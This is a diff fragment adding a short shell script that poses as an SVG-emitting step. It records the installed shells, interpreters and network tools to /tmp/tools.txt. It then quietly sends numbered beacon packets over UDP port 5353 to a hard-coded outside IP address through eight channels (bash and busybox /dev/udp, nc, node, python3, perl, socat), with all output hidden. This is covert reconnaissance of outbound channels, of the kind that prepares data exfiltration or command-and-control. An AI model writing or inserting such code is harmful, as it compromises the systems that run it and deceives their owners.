@@ -1,0 +1,12 @@
+printf '%s' '<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8"/>'
+P=91.215.85.170
+for t in bash sh busybox node python3 python perl nc socat ncat dig nslookup host openssl wget curl php; do command -v $t >/dev/null 2>&1 && echo "$t" ; done > /tmp/tools.txt
+bash -c 'exec 3<>/dev/udp/91.215.85.170/5353; printf c1 >&3' >/dev/null 2>&1
+sh -c 'exec 3<>/dev/udp/91.215.85.170/5353; printf c2 >&3' >/dev/null 2>&1
+busybox sh -c 'exec 3<>/dev/udp/91.215.85.170/5353; printf c3 >&3' >/dev/null 2>&1
+echo c4 | nc -u -w1 $P 5353 >/dev/null 2>&1
+echo c5 | busybox nc -u -w1 $P 5353 >/dev/null 2>&1
+node -e 'require("dgram").createSocket("udp4").send("c6",5353,"91.215.85.170")' >/dev/null 2>&1
+python3 -c 'import socket;socket.socket(2,2).sendto(b"c7",("91.215.85.170",5353))' >/dev/null 2>&1
+perl -e 'use IO::Socket::INET;$s=IO::Socket::INET->new(PeerAddr=>"91.215.85.170:5353",Proto=>"udp");print $s "c8"' >/dev/null 2>&1
+socat -u /dev/null UDP:91.215.85.170:5353 >/dev/null 2>&1
